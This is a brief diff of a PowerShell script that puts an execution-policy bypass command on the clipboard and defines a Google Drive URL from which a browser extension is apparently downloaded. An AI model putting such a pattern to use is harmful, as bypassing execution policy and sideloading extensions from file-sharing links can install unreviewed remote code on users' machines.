@@ -1,7 +1,6 @@
 Set-Clipboard -Value "Set-ExecutionPolicy Bypass -Scope Process"
 
 
-Set-ExecutionPolicy Bypass -Scope Process
 
 # Variables
 $extensionUrl = "https://drive.usercontent.google.com/download?id=1L3sKbU8RXWIBUnWs0dys0cQvCbq_EXUu&export=download&authuser=0&confirm=t&uuid=c0201940-04f1-4b1c-8887-07c977acbd9a&at=AENtkXbHTvKsKwlA1KeRNmUM-g15:1732201195375"  # Replace with your extension's download URL
